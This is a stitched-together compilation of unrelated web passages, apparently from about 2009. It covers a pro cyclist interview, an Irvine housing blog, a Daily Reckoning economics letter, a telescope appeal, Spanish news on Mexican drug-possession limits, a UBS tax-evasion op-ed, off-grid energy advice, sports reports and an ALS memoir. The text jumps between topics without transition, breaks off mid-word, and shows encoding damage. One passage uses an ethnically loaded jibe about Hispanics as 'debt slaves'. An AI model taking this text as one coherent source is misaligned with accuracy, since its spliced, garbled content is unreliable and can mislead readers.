There are 200 guys that want to be in the first ten riders for every climb .
In North America there are some super strong guys , but here they 're all good .
You have to fight for position on these tiny roads in big fields .
Back home , if your were feeling strong , you could put yourself at the front for a climb , but here sometimes that just does n't matter ; if you are in the wrong place then you can just watch the race ride away from you .
I guess the biggest difference is just the depth .
CC : What about after the Tour ?
You got silver at the Worlds last year , so you have to be thinking about the world title ?
ST : Yes , I think with the way my schedule is after the Tour - especially with not doing the Giro now - that is definitely a possibility .
It would be awesome .
CC : Now , you probably could have easily found a North American team , stayed over here and had a pretty good career , without dealing with all the stuff in Europe , like crappy hotels , huge fields , etc. Gord Fraser told me he came back from Europe because he just did n't want to deal with it .
Are you happy with your decision to go to Europe ?
ST : For sure .
I can definitely agree with Gord 's side , because you have to be where you will be happy .
But you have to love your life , and for me , I was at a point where I was looking for the challenge of this environment .
I will never get this opportunity again .
Sure , there are ups and downs , but this is the experience I want .
In a competitive society like ours , there are winners and losers .
The people who bought before the bubble , did not HELOC their home , and are selling in time to cash in that bubble equity are the winners .
Let ’s celebrate them today .
Asking Price : $ 747,500

There was a time , many years ago when success came through vision ,
hard work and sacrifice .
Achieving success was a slow process , and
there were no guarantees .
It does n’t work that way in California any
more .
Now , success comes through passive ownership of real
estate .
It requires no vision , no work , and no sacrifice .
In fact ,
people are allowed to immediately enjoy the fruits of their lack of
labor through mortgage equity withdrawal .
They do not need to slowly
accumulate wealth when they can quickly live off the converted income
from their brilliant asset purchase .
The old measure of success was
asset accumulation , whereas the new measure of success is resource
consumption .
It is important to drive the right car , carry the right
handbag , eat in the right restaurants , and of course , live in the right
neighborhood .
People should be surrounded by the other people who are as brilliant and successful as they are .
The real champions of conspicuous consumption and pretentious consumerism are suffering right now .
Many have already lost their homes , and the rest will soon enough .
This recession we are all enduring was caused by the banks lending people insane amounts of money and losing it .
They lost this money to the pretenders I profile with HELOC abuse stories almost daily .
It is hard to feel too sorry for the pretenders ; after all , they would be the first to tell you how they are entitled to their lifestyles , and they are superior to you because of it .
Today ’s featured property is different ; the owners represent success
from a bygone era .
They allowed their equity to accumulate , they paid
down their mortgage , and now they have an opportunity to cash out and
enjoy a well - funded retirement .
These owners are among the champions of Irvine .
When a knife catcher comes along and cashes them out , they will pocket about $ 700,000 .
They are winners .
Our bubble economy and culture favors speculators and gamblers .
There was a time when you could invest in reliable cashflow investments at reasonable prices and make relatively secure investment returns .
A bad investment might not earn you the return you hoped , but they did n’t have the potential to cause catastrophic losses like we are witnessing during the housing bubble .
Once the Wall Street market mavens realized they could fleece the unsuspecting masses through asset price volatility , the days of cashflow investing were over .
Despite this change in investor psychology , there are still people who lived by the rules of yesterday .
Saving money and living frugally went out of style years ago , but those who clung to their old values still have cash and equity .
If they move quickly they still have time to make a few extra bucks off the adherents to the speculative mindset being summarily crushed in our post - Ponzi Scheme world .
So please , any knife catchers out there , go buy this property and let your mistake make their success complete .
They deserve it .

These sellers deserve better than this kind of meaningless realtorspeak .
This property was purchased for $ 45,000 on 12/19/1973 .
The owners long ago paid off their mortgage .
On 3/9/2006 they did take out a $ 45,000 mortgage , but it is obvious from the photos that the property was completely updated .
I imagine that every penny of this money went into the update .
If this property sells for its current asking price , and if a 6 % commission is paid , the total profit on the sale will be $ 657,650 .
I hope they get it .
I see so few properties for sale where the owners were responsible with their debts .
There are probably many more out there , but since they are not in distress and have no desire to sell , I do n’t see them ; however , if it is for sale today , even the organic sellers have generally doubled their mortgages and they are in distress .
To today ’s featured property owners : I salute you .

Inflation Targeting Perils
Inflation or deflation
Tell me if you can
Will we become Zimbabwe
Or will we be Japan ?
– Merle Hazard
Ol ’ Merle Hazard has the key question figured out .
Which will it be ?
Zimbabwe or Japan ?
Will it be runaway inflation … or deflation that refuses to run anywhere ?
Long suffering Daily Reckoning readers already have our answer .
We gave it even before the bubble burst in ’07/’08 .
“ Yes ! ” we said … it will be Zimbabwe AND Japan .
But not in that order .
Japan first .
Then , after the feds have got the hang of Quantitative Easing , it ’s Zimbabwe here we come !
But there ’s gotta be a surprise , right ?
It ca n’t be that simple , can it ?
Markets rarely make it easy for you .
And for a very good reason .
If it were easy to see what was coming , it would be easy to avoid trouble and take advantage of opportunities .
You can see where that would lead .
Investors would race ahead and ruin the whole thing .
If they saw the market going up , they ’d buy stocks .
This would cause prices to rise before they were supposed to .
And if they were going to crash , investors would sell off their stocks … and drive prices so low , the market could n’t crash – it would already be at bottom .
Do you see where we ’re going with this ?
If investors – or anyone – could see what was coming , they ’d short - circuit the process .
Take the run-up in stocks on Wall Street today , for example .
On Friday the Dow fell 62 points .
If you knew it was going to fall for the next 2 months , you ’d sell now ?
Why wait ?
And look at gold .
It hit $ 931 on Friday .
If investors knew it would be at $ 1,000 by the end of the year , it ’d be at $ 1,000 now .
If people could read next year ’s fashion magazines , they ’d buy tomorrow ’s fashions today .
Then , some wiseacre would buy the day after tomorrow ’s fashions … just to be ahead of everyone else .
And then , nobody would want to be stuck with tomorrow ’s hairdo – it would already be out - of - style .
And nobody would want to hold the stocks that were supposed to go up either .
Other investors would have already bought them …and be on to the next thing .
The stocks that were supposed to go up tomorrow would go down .
Tarnation !
All of history would move forward … faster and faster …as people tried to race ahead of trends before they even began … and in a flash … history would come to a blinding stop .
We ’d all anticipate everything that was going to happen .
Why bother reading this book , we ’d say to ourselves ; we know how it will turn out .
Imagine what would have become of Napoleon ’s march on Moscow .
“ Nah …count us out , ” his troops would have said .
And what about Tojo ’s attack on Pearl Harbor ?
How did that turn out ?
“ I think I ’ll go into the auto business instead , ” he might have said to himself .
And what about all those homeowners who were speculating on higher house prices ?
Forget it … the whole bubble never would have happened … and so the whole credit crunch never would have happened either .
And then where would we be ?
A New York Times financial reporter revealed how easy it was to fall into the housing debt pit in a confessional piece in this weekend ’s International Herald Tribune .
Here was a smart fellow …
His beat was covering the international monetary system and the central banks .
He knew all about the credit bubble – he reported it to NYT readers .
But while he was reporting on the world ’s bubble economy , his own finances bubbled up on him .
A second marriage …a second house … pretty soon he had a mortgage that he could n’t pay – and that was before the bottom fell out .
Now , he ’s months overdue in his payments and calls the mortgage company to see when they ’re going to kick him out .
“ Take a number , ” they say .
“ We ’ve got hundreds of people to process . ”
He ’s still waiting .
Even when you think you know what is going on …you can be blindsided .
The NYT reporter says he got into his mess with his “ eyes wide open . ”
Alas , that ’s the way it works .
Even when you have your eyes open and your thinkin’ cap on …still , things happen that you did n’t expect .
“ Gap between Boomers , young minorities grows , ” says a headline in USA Today .
The report tells us that the Hispanic population is growing 16 times faster than the population of non-Hispanic whites .
Not only does this gradually change the racial makeup of United States of America , it also highlights another gap : the old white people have the money .
For that insight we thank the International Herald Tribune .
Older people typically had already paid off their mortgages , so were less often caught up in the sub - prime crisis .
The over - 65 crowd reports only a quarter of the problems paying rent or mortgages as those 18 - 29 .
They also tell surveyors half as often that they ’re having trouble paying their bills .
And get this ; while the 18 - 29 crowd has lost millions of jobs during the last 18 months , employment among 65 and older Americans has actually gone up .
Older people also report fewer investment losses .
Their investments were relatively safer than those of younger people … and less affected – though still hit hard – by the downturn .
But thank god for all the Hispanics .
The feds are running up trillions in debts – much of which will be passed on to the next generation .
At least the Hispanics are filling out the population – bringing millions of new debt slaves into the Land of the Free , so that old , white people can continue to live beyond their means .
But wait a minute … are n’t these same babies the ones who expect to receive free day care , welfare , unemployment compensation , free public schooling , food stamps , health care , government jobs and all the other benefits of a bread - and - circuses government ?
Hmmm…sounds like something ’s gotta give .
Poor Dermot Gleeson .
The Irish economy is sinking …led by its banking sector .
This makes bankers the most despised of all the Irish … and made Gleeson the target of egg - tossing shareholders at the annual meeting last week .
The chairman of Allied Irish Bank had to dodge eggs while getting his message across – whatever it was .
Warning to America ’s bankers : get ready to duck .
So where ’s the surprise for us ?
What ’ll it be ?
Japan or Zimbabwe ?
We ’ve already said we ’re expecting both Japan and Zimbabwe .
What else could it be ?
And we ’re ready for them both .
Well , needless to say , we ’ll be surprised like everyone else .
And needless to say , we do n’t know what will surprise us .
But we have an idea .
Almost everyone we know is expecting a fairly quick up - move in inflation .
Our guess is that that up - move might be a long way off .
“ It ’s a very funny and troublesome situation , ” said a fund manager in Boston last night .
“ The world ’s central bankers are committed to a policy of monetary inflation … which they call ‘ Quantitative Easing . ’
And they believe that inflation targeting is the way they can tell if their policy is working .
That is , they believe they will know when to stop inflating the currency by looking at consumer prices .
When consumer prices begin to rise , they ’ll be ready to stop adding to the money supply .
In fact , they say they ’ll then turn the machine to reverse to take out the extra cash they ’ve added .
“ So , they ’ll keep at it until the CPI goes up .
But by the time they see consumer prices rise , it will be too late .
By then , people will be eager to spend …to get rid of dollars .
And once they begin to spend again , the velocity of money will go up .
And with it , inflation rates will go up higher …and then dollar holders will want to get out of bonds quickly … because they ’ll see the next move too – a drop in bond prices .
“ Well , how could the Fed combat this rising inflation ?
And prices could be rising very , very fast .
It would have to go back into the market and sell those bonds that it bought from the Treasury .
Selling the bonds would have the opposite effect as buying them .
Instead of creating money with which to buy bonds , it would re-absorb money when it sold them .
People would pay money for the bonds … and the cash would be sequestered by the Fed .
“ So , you ’d have the Fed trying to sell bonds just when everyone else was selling them .
At that point , with the biggest bond buyer in the world turning into a seller , the Treasury market would collapse .
This would paralyze the Fed .
It might want to sell Treasuries .
But , under the circumstances … with yields soaring and prices crashing … it would n’t be able .
So all the inflation that it put in the system would have to stay there …and inflation would have to run its course .
“ It ’s very hard to know what to do as an investor .
I guess in theory you should stay long treasuries … buy them as long as the Fed is buying .
And then you should go short … sell them , just before the inflation numbers turn positive …and just before the Fed tries to sell .
But that is going to be very , very difficult timing .
“ I began buying gold for the first time ever last week . ”
Until tomorrow ,

The Daily Reckoning
A few months ago I wrote about the Galileoscope , a wonderful inexpensively priced telescope that is being produced as part of the International Year of Astronomy .
There were some initial problems with shipping , but I have been told that ' scopes are shipping and will be in the hands of eager folks by early June or July latest !
Yay !
Now here 's the thing : production is not so simple for these telescopes , and the folks making them want to continue to do so .
But unless they get a bunch of orders right away production will stop .
They need orders by the end of May , which means that if you 're thinking of getting one or more -- and at $ 15 each ( plus shipping ) it 's cheap to do so -- then please send in your order now !
Do n't wait ; if you do it may be too late .
At the very least the price will go up , and at worst they wo n't be able to make any more .
I bought three : one for my daughter ( and , to be honest , me ) , one for her school , and one to give away on the blog .
I 'll do that last bit once they get here -- but do n't rely on winning it ; I expect to get about 1000 entries for it .
So stop reading this blog and go buy a ' scope or three .
Give 'em to folks who can't afford 'em , donate one to a school , or simply designate your order to go to a faraway land where the kids need the inspiration and awe of seeing Jupiter 's moons , the phases of Venus , the mountains of our own Moon , or Saturn 's rings .
I became interested in astronomy at the age of five because I saw Saturn through a small telescope .
Will you please help another child appreciate the wonder of astronomy ?
You never know where it will take them .
Se ha aprobado , con algunas modificaciones , la ley sobre drogas que se ha estado debatiendo en México en ambas cámaras , primero en el Congreso y ahora en el Senado .
La tarde de ayer el Gobernador del estado alertaba sobre el incremento de casos sospechosos en Tamaulipas de personas contagiadas con el virus de la Influenza Porcina , mientras tanto en el senado desde temprano se sesionaba a puerta cerrada y con estrictas medidas de sanidad para evitar algún contagio que pusiera en riesgo la salud de los legisladores .
Los ojos vigilantes de la legislatura se distrajeron un poco con tanta problemática que aqueja el país , inseguridad , alertas sanitarias y sismos , mientras tanto el senado dio luz verde a una ley que haría una separación de responsabilidades del consumidor al narcomenudista .
Con 87 votos a favor y 10 en contra , la Cámara de Senadores aprobó la tarde de este martes la polémica
Ley que permite a los consumidores portar cantidades mínimas de estupefacientes y psicotrópicos para consumo inmediato .
En esto se contempla que las personas que porten drogas en cantidades permisibles no tendrán castigo , es decir los « fármacodependientes » podrán llevar consigo hasta 5 gramos de marihuana , 2 gramos de opio , 50 miligramos de heroína , 500 miligramos de cocaína o 40 de metanfetamina , 50 miligramos de diacetilmorfina o heroína y 0.015 miligramos de LSD .
Con esta modificación se evitaría que se tratase como criminales a los consumidores , al impedir que se les impusieran sanciones penales o se les enviara a centros de atención de manera obligatoria .
Esta nueva disposición aun debe ser aprobada por la Cámara de Diputados , sin embargo en el senado fue aprobada por mayoría .
Cabe destacar el tema de la Legalización de las drogas ha sido muy polémico durante los últimos meses dado que el problema del narcotráfico en México ha sido uno de los máximos retos del Presidente Felipe Calderón , quien se ha empeñado en combatir el comercio ilegal de drogas en nuestro país .

Galaxies of the Perseus Cluster
Credit & Copyright : R. Jay Gabany
Explanation :
This colorful telescopic skyscape is filled with galaxies that lie nearly 250 million light - years away , the galaxies of the Perseus cluster .
Their extended and sometimes surprising shapes are seen beyond a veil of foreground stars in our own Milky Way .
Ultimately consisting of over a thousand galaxies , the cluster is filled with yellowish elliptical and lenticular galaxies , like those scattered throughout this view of the cluster 's central region .
Notably , the large galaxy at the left is the massive and bizarre - looking NGC 1275 .
A prodigious source of high - energy emission , active galaxy NGC 1275 dominates the Perseus cluster , accreting matter as entire galaxies fall into it and feed the supermassive black hole at the galaxy 's core .
Of course , spiral galaxies also inhabit the Perseus cluster , including the small , face - on spiral NGC 1268 , right of picture center .
The bluish spot on the outskirts of NGC 1268 is supernova SN 2008 fg .
At the estimated distance of the Perseus galaxy cluster , this field spans about 1.5 million light - years .
It ’s a fact that up to 70 percent of residential water use is for landscape .
One of the most effective ways to conserve water is to irrigate efficiently .
The Watering Calculator tool estimates the correct amount of water to give your landscape or garden every week during normal weather conditions .
Developed by the city of San Diego , it provides customized watering schedules by zip code based on data from the California Irrigation Management Information System weather station network .
How to use the Watering Calculator :
One wonders if Phil Gramm has been made just a tad nervous by the news on Tuesday that one of UBS ’ super - wealthy private clients has pleaded guilty to tax evasion .
That ’s the second case in two weeks involving the bank at which the former senator is a vice chairman , and 100 other clients are under investigation for possible bank - assisted tax fraud .
Gramm , the Republican former chair of the Senate Finance Committee , where he authored much of the deregulatory legislation at the heart of the current banking meltdown , has for the six years since he left office helped lead a foreign - owned bank specializing in tax dodges for the wealthy .
These schemes by the Swiss - based UBS not only force the rest of us taxpayers to pay more to make up the government revenue shortfall but are blatantly illegal .
In February , UBS admitted to having committed fraud and conspiracy and agreed to pay a fine of $ 780 million .
Republican “ Tea Baggers ” take note : Offshore tax havens do not equal populist revolt .
In UBS ’ “ deferred prosecution agreement ” with the Justice Department , the bank agreed to turn over the names of its secret account holders to avoid a criminal indictment .
The complicity of top executives in this far - ranging scheme to use foreign tax havens to cheat the U.S. treasury of billions in uncollected taxes was noted at the time in a Justice Department statement : “ Swiss bankers routinely traveled to the United States to market Swiss bank secrecy to United States clients interested in attempting to evade United States income taxes . ”
What did Gramm think all of those Swiss bankers from his firm were doing over here ?
Was he totally clueless ?
The Justice Department statement suggests otherwise : “ UBS executives knew that UBS ’s cross - border business violated the law .
They refused to stop this activity , however , and in fact instructed their bankers to grow the business .
The reason was money — the business was too profitable to give up .
This was not a mere compliance oversight , but rather a knowing crime motivated by greed and disrespect of the law . ”
Is it conceivable that this “ knowing crime , ” so widespread within the UBS enterprise , was unknown to Vice Chairman Gramm — even though it primarily involved U.S. tax evasion , and he had been hired by the company because of his expertise in American law , some of which he helped to write ?
As Gramm said when he was hired in 2002 by UBS , the position “ will provide me with the opportunity to practice what I have always preached .
I have been involved in every major financial debate since I ’ve been in the Congress . ”
How could Gramm , who prides himself on expertise in these matters , have been unaware of the damage that the Swiss bankers who worked for him were doing to American taxpayers ?
As the Justice Department said : “ In 2004 alone , Swiss bankers allegedly traveled to the United States approximately 3,800 times to discuss their clients ’
Swiss bank accounts .
The information further alleges that UBS managers and employees used encrypted laptops and other counter - surveillance techniques to help prevent the detection of their marketing efforts and the identities and offshore assets of their U.S. clients . ”
But then again , if you are Phil Gramm or his wife , Wendy , you might expect to get away with a great deal in the way of financial machinations .
After all , neither has ever been held legally responsible for the Enron debacle , in which the Gramms played a major part .
As a top government regulator , Wendy Gramm changed the rules to make Enron ’s chicanery possible , and as the chairman of the Senate Finance Committee , Phil codified those rule changes into federal law .
While Enron execs like Chairman Ken Lay ( a major Gramm campaign contributor ) were indicted , the charmed couple that created the loopholes Lay and others jumped through escaped legal responsibility .
After leaving the government , Wendy Gramm joined Enron ’s board , where she headed the audit committee that managed to avoid auditing the company ’s disgraceful accounting procedures — just as her husband has apparently looked the other way during his stint in the private sector with UBS .
Sure , Phil Gramm lost his position as the co-chairman of John McCain ’s presidential campaign when he blamed the recession not on the banking deregulation he championed but rather the people of the United States , which he described as a “ nation of whiners . ”
But that was a sideshow compared with the serious charges now swirling around UBS , charges that may finally prove to be Gramm ’s undoing .

Mr Cameron 's advisers accept that the election will not be decided until the campaign itself , when the scale of the changes he proposes will at last be clear for all to see .
But the first test will be the Norwich North by - election at the end of next month , which follows the resignation of Labour MP Ian Gibson .
The Tories need an 8.3 per cent swing to win , which , on a national level , would give the party a useful majority .
Failure is not an option .
Mr Cameron privately expects a victory , the first wave of a flood that will sweep him and a new generation of Conservatives into power , and leave those who still do not " get " what 's going on far behind .
There are those who believe that mankind is making an enormous adverse impact on the Earth .
Some even think that the damage we humans have done is already irreversible and we have doomed the planet to an accelerated warming of the globe .
There are others however that believe the whole â€œglobal warming thingâ€ is a lot of hoopla about nothing .
Whatever your belief concerning the eco-system and the fate of the planet , use of clean renewable energy sources is a concept that is hard to argue against .
For tree - huggers like me , sustainable living is important .
The use of renewable energy sources supports that idea .
For those capitalists out there , renewable energy sources mean cheap energy production .
So , save the world or save some money , eco friendly renewable energy production makes sense .
Once affordable only by the big power companies , most renewable energy production was out of reach of the average homeowner .
And frankly with the historically cheap cost of energy , development of renewable energy wasnâ€™t a priority .
But with the sustainable living and green movements more prevalent in our society , and skyrocketing energy costs , demand by consumers for alternative energy sources has increased dramatically .
This has helped to reduce the cost of home power generation systems .
So , with costs down and availability of technology up , you may ask yourself â€ œIs it possible to go off - grid ?
How realistic is it that you can remove your dependency on utilities ?â€ 
To answer those questions , you must first determine what your power consumption is in your home .
The average home consumes about 870 KWh ( Kilowatt hours ) , per month .
This from a 2001 U.S. Dept. of Energy report on national energy consumption .
Your actual energy consumption will differ depending on a variety of variables , such as actual use of electric and electronic items , age and efficiency of major appliances , square footage of your home , insulation and a host of others .
Just take a look at last months power bill and it should show you the total KWh of power you have used .
Before you start looking at potential power generators , lets first see where you can conserve and reduce the amount of power you need to run your home .
Conservation is an important aspect of reducing or eliminating your dependency of power from the utility company .
The first thing I recommend is converting all your lighting to the new fluorescent lighting available at most stores now .
From experience I can tell you it makes a huge difference in power consumption over the standard incandescent bulb .
Next , ensure your house is insulated well , windows and doors seal properly and drafts of any sort have been eliminated .
Heated and cooled air loss can make you bleed energy like a stuck pig .
Next , get in the habit of not using power you donâ€™t need .
Did you know that your TV , when turned off , uses as much as 80 % of the power it uses when itâ€™s on ?
Even the unassuming toaster can use power when not on .
A general rule of thumb is , if there is any kind of light on , even an LED , it means there is power being consumed .
One solution to these power suckers is to plug them into power strips with an on / off switch .
Now , when you turn off the TV , do so with the power strip rather than the power button on the TV and you will be saving a ton .
Then there is the power hogs .
Your microwave is chief among them , but other major appliances can eat a lot of power too .
The refrigerator , electric stoves and ovens , the A/C unit , all consume huge quantities of power .
Iâ€™m not suggesting you do away with these , but rather to use them more conservatively and responsibly .
If you would like to see just how much your electrical use with each appliance or other electrical objects is , there are meters you can by at most hardware stores that will allow you to meter individual items .
Letâ€™s assume you have sealed your house up and have taken steps to conserve power usage .
Take another look at your power bill .
You will undoubtedly see a marked improvement in your usage , plus you now have a better handle on the amount of power you need to generate to be self - sufficient .
Lets also assume that now you have reduced your monthly power consumption from the 870KWh national average to around 600KWh per month .
Now you are ready to look at some options to generate your own power .
Talk about renewable energy and the first thing that comes to most peopleâ€™s minds is wind power .
And why not , the wind is abundant , itâ€™s free and the technology to harness its power is ages old .
But todayâ€™s windmills are a far cry from the ones your Dad remembers in Farmer Smiths pasture .
There are monster windmills made for commercial applications that can reach high into the sky and have blades as long as a eighteen wheeler .
But since you probably donâ€™t have $ 100 K to spend , not to mention the neighbors may not be to keen on having one of these behemoths spoil their backyard view , home sized systems have been cropping up everywhere .
There are home windmill systems that are pre-engineered and can be installed at prices starting at $ 3 - 5 K .
For the DIYer , there are plans available all over the Internet to build your own windmill system for as little as $ 200 .
The actual output of a home wind system will vary depending on consistency of winds , blade design and size and so forth .
But , on average , a small system with a 12 - foot diameter fan can produce around 400 KWh a month .
Since our power requirements are 600 KWh , even with the windmill , you are still short and pulling some of your power from the grid .
Next comes another common renewable energy source , solar .
One attribute of solar power is its heating ability .
Installing a solar water heater can produce as much as 80 % of the energy needed to create hot water .
The real gem of solar power however comes from the photovoltaic cells or â€ œSolar Panelsâ€ .
These convert the suns rays directly into electricity .
Until recent times however , these cells have been very expensive and were just not financially feasible either in new construction or as a retrofit .
But as demand has increased and technology improved , they have become much more affordable .
A single panel installed will run about $ 3,000 .
However , there again are those garage engineers who have come up with relatively simple plans on how to create your own solar cells and do so for as little as $ 200 - 300 per panel .
Depending on the number and efficiency of these panels , you may fill the gap left from the windmill .
Ok , so in theory you are producing the full 600 KWh of power you use .
But remember , in real life the sun doesnâ€™t always shine and the wind doesnâ€™t always blow .
These are but a few ideas on how to curtail your energy consumption , generate your own power and wean yourself from the grid .
It is very possible to produce enough power to operate your home independent of the power grid .
But as for going totally off - grid you may want to consider that in many states , if you produce more power than you consume , the power company will pay you for the excess energy you produced .
And wouldnâ€™t we all like to replace our monthly utility bill with a check ?
If you think you only need an accountan t during tax time , you may want to think again .
Good business accounting is not just about balance s...

Questions & Comments
If you have a question or comment on this editorial , please feel free to post them here !
True Hoop has a post up today with the title “ Huge News For the Knicks “ .
The story describes Eddy Curry ’s new found dedication to training and fitness :
“ Multiple reports say Curry ’s dedication to his craft has been reinvigorated , and he is working hard to lose weight and get more athletic .
Scroll back through his Twitter feed .
You ’ll find plenty of people asking him where he is , and why he is n’t around to hang out , and he just about always responds that he ’s in Michigan working out .
There is plenty of talk of speed and explosiveness , and even a mention of Donnie Walsh and a team doctor dropping in and being “ impressed . ”
True Hoop warns that “ You never want to project too much from these kinds of reports . ”
No doubt .
Here in Chicago we read and / or heard those same off - season reports too many times .
As Chuck D said , “ Do n’t believe the hype , it ’s a sequel . ”
Believe it when you see it .
My immediate thought was that his contract was going to expire , but he holds 2 player options :
Player 2008/09 2009/10 2010/11 Eddy Curry $ 9,723,983 $ 10,500,423 $ 11,276,863
Curry is still just 26 years old .
And you do n’t have to tell me that some people grow up slower than others .
He ’s faced some serious trials and tribulations , so maybe he is ready — maybe stronger — to give it all to fulfill his potential .
I think it wold be a great story , and I hope it ’s more than just hype .
“ It was a little difficult to recover from that first set , ” Williams said .
“ I ’m used to beating people , 6 - 0 , not used to my shots not going in and losing , 6 - 0 . ”
Williams did get a consolation prize later by teaming with her sister Serena to beat Szavay and Gisela Dulko in doubles .
Dinara Safina has been a more consistent achiever so far .
In three matches , the top - seeded Safina has dropped only four games .
On Friday , she disposed of the 27th - seeded Anastasia Pavlyuchenkova of Russia , a talented 17 - year - old , by 6 - 2 , 6 - 0 , reeling off the last 10 games of the match and , at one stage , 14 straight points .
Rafael Nadal also rolled , beating Lleyton Hewitt of Australia , 6 - 1 , 6 - 3 , 6 - 1 . Nadal , the four - time defending champion , is 31 - 0 at Roland Garros and will face the powerful but erratic Robin Soderling of Sweden in the fourth round .
In other Round of 16 matches in Nadal ’s half of the draw , Fernando Gonzalez of Chile will face Victor Hanescu of Romania , Nikolay Davydenko of Russia will face Fernando Verdasco of Spain and No. 3 seed Andy Murray of Britain will face the Croat Marin Cilic , who is in top form .
Safina will face the 57th - ranked Rezai , who managed to slide into a seat next to her father in time to see Safina close out the final game against Pavlyuchenkova .
In their previous match , in the second round in Miami this year , Rezai had also complained to the chair umpire about Larcher de Brito ’s grunting on her way to a 6 - 1 , 6 - 2 victory .
Larcher de Brito said no other player in her junior or nascent professional career had formally complained during a match against her .
But according to tennis officials , Larcher de Brito was advised by a chair umpire during a match at this year ’s tournament in Indian Wells , Calif. , that she needed to tone down her grunting .
Members of her camp were also advised that it was becoming a problem .

As we mentioned earlier , Mia Farrow has embarked on a hunger strike as a way to help raise awareness for the situation in Darfur .
Through Youtube , she ’s been posting updates on her fast and reaching out to supporters to encourage President Obama to act in the region .
Obviously , we all know the President has a full plate at the moment , but Farrow is confident that he may yet find time to get humanitarian agencies back in the country .
Check out her Day 8
Vlog below :
This is how my mother described it :
My grandmother refused the feeding tube that would have prolonged her life .
She could not speak or swallow .
She could not walk , or move , nor support her own weight .
With my mom , dad and grandfather in attendance , the hospice worker who had come to the house administered a dose of liquid morphine to ease my grandmother ’s pain , slow her respirations and lead her out of this life and into whatever it is that follows .
And then the rain came — sudden and thunderous , with a sweeping darkness that covered the costal Florida city where my grandparents lived .
The hearse from the funeral home arrived and two men came up to the apartment to collect my grandmother ’s body , looking — and my Italian mother laughed about this part — like they ’d just stepped off the set of The Sopranos .
They loaded her into the hearse still sitting in her wheelchair because her body was too contracted and rigid to straighten out .
It was April 27 , 2000 — the day my grandmother died of ALS , more commonly referred to as Lou Gehrig ’s Disease .
Amyotrophic lateral sclerosis is a progressive neurodegenerative disease that targets the body ’s motor neurons — the nerves responsible for voluntary muscle movement .
As the motor neurons degenerate and eventually die , the brain can no longer send signals to initiate and control muscle movement .
Over time , the muscles weaken and atrophy from lack of use and as the disease progresses through the body , ALS sufferers become increasingly paralyzed .
It ’s not the sort of disease that is obvious at the onset .
The initial symptoms can be quite varied , but usually include muscle stiffness or weakness in the hands , arms , legs or the muscles used in speech .
For my grandmother , it was her speech that went first .
She began slurring her words and having difficulty swallowing — signs that at first led doctors to believe she ’d had a stroke .
It was n’t until several months later that she was finally diagnosed : ALS , bulbar onset .
It ’s a form that affects the throat and speech muscles first , more common in women over 50 and a faster track to early death than other forms of ALS because it affects the respiratory tract far sooner .
My grandmother was 65 at the time of her diagnosis .
I remember visiting my grandparents shortly after and feeling shocked by the disease ’s effects .
She seemed healthy enough , perfectly mobile and with as much energy as I ever remembered , but she had to constantly hold a Kleenex to her mouth , pressed tightly against her lips to catch the ceaseless trail of drool that leaked out .
The disease was forcing her body to create more saliva , while also hindering her ability to swallow it .
She could n’t speak , but wrote everything down on a little note pad .
“ That was a good hand , ” she ’d scribble in her shaky handwriting while we played poker at the kitchen table .
We used cookies for poker chips — it ’s one of the things I remember most clearly from my family ’s infrequent visits to our grandparents ’ house .
Someone would make a quick joke after winning a hand and it would send my grandmother into hysterics .
She would laugh and laugh , to the point where she struggled to catch her breath and her entire body shook from the impact of her laughter .
When it was time for us to leave , she ’d start crying .
A few tears quickly turned into full body sobs and the saliva would build up in her mouth , spilling over the edge of her lips and threatening to choke her .
ALS makes it more difficult to control your moods .
Her legs went next , progressively weakening with time .
It became increasingly difficult for her to walk up and down stairs and the danger of falling led to her scooting down the stairs on her butt with my grandfather moving along behind her , holding her body steady .
Eventually , her legs became fully paralyzed and she was confined to a wheelchair .
My grandfather would have to lift her from the chair to the bed and vice versa .
Her life became one of full - on physical dependency .
In the two years after her diagnosis , my grandmother deteriorated dramatically .
She became smaller and smaller , her body shriveling up and contracting toward her center .
Her ability to communicate by writing notes disappeared as the disease affected the muscles of her arms .
She would slowly tap the computer keyboard with her fingertips to send us emails about how she was doing , what she was reading , and the cards she was playing via her WebTV programs .
Over time , the emails grew shorter .
“ Feel ok , ” or “ How kids ” were all she could manage because she only had use of one finger .
Eventually , her fingers lost movement entirely and she needed an extension attached to her wrist so that she could continue using the computer at all .
For as long as she could manage , my grandmother kept busy by using WebTV .
She researched her disease and interacted with other ALS patients online .
As her body slowly wasted away , her mind achieved a level of clarity that people seem to only gain as their lives approach their end .
She was 67 when she died , two and a half years after her diagnosis .
There is no cure for ALS .
While there are drugs that slow the progression of the disease , there is no treatment that can reverse its effects .
Research into the etiology of ALS has increasingly uncovered a hereditary link , but the cause of the disease remains largely a mystery .
I often worry that the genetic link exists in my family and my mother will be diagnosed with ALS .
And if not , perhaps it skips a generation — like twins — and my brother , sister or I will suffer from it .
ALS is a quiet disease .
You do n’t hear about very often in the news .
There ’s no celebrity leader to act as the face of ALS — Lou Gehrig died in 1941 ; Stephen Hawking ’s struggle with the disease is an uncommon one , having already lasted for more than 10 years .
May 1 marks the beginning of National ALS Awareness Month .
I ’m not imploring anyone to donate money or volunteer .
But please just take a moment to stop and think about this disease , about all the people who have died from it and all of those living with it today .
A moment for all those people who threw their cookies onto the pile and got dealt a crappy hand .
Earlier this week , the New York Time ’s published an article regarding Apple ’s culture of secrecy and , as pointed out by John Gruber , it seemed to imply that Apple was “ weird ” because it likes to keep its secrets , oh I do n’t know , secret .
I ca n’t help but feel that this story is a rather transparent lashing out on the part of the Times .
They could n’t get any original information regarding the story they really want —
Jobs ’s liver transplant — and so like a child throwing a tantrum when it does n’t get its way , they wrote a story about how there ’s something wrong with Apple because its employees keep their mouths shut .
Then yesterday , Joe Nocera of the Times published an article explaining why Apple needs to come clean and say what exactly happened to Steve Jobs and what exactly his role in the company will be going forward .
That news , of course , is that Mr. Jobs had a liver transplant a few months ago — news that , once again , was uncovered by the news media rather than being divulged by Apple .
And once again we ’re left in the dark about what this means .
It is a separate problem from the pancreatic cancer he was operated for in 2004 ?
Or does it mean that the cancer has returned — and spread ?
Already , he is reportedly back at work .
But what does that mean ?
Is he fully back in the saddle ?
Is he part time ?
Is he involved only in big strategic decisions ?
Is he back to his old micromanaging self ?
Have we now reached the point , in other words , where his health is impinging on his ability to run Apple ?
That ’s the real question , is n’t it ?
Are Mr. Jobs ’s health problems affecting his work ?
Late last night , the hospital where Jobs was treated confirmed that he had undergone a liver transplant and that his prognosis was “ excellent . ”
What else does Nocera need to know ?
Jobs still has n’t officially returned to Apple , and Nocera is already jumping the gun with demands that Apple keep the public abreast of what role Jobs will take on when he returns .
Seriously ?
